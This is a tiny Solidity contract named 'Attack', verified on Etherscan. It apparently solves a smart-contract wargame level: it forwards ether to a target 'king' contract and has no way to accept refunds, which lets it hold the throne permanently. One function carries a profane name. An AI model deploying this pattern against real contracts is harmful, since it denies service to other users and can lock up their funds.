/**
 *Submitted for verification at Etherscan.io on 2022-07-15
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Attack {

  address payable king;

  constructor(address payable addr) public payable {
    king = addr;
  }

  function fuck() public payable {
    king.transfer(msg.value);
  }
}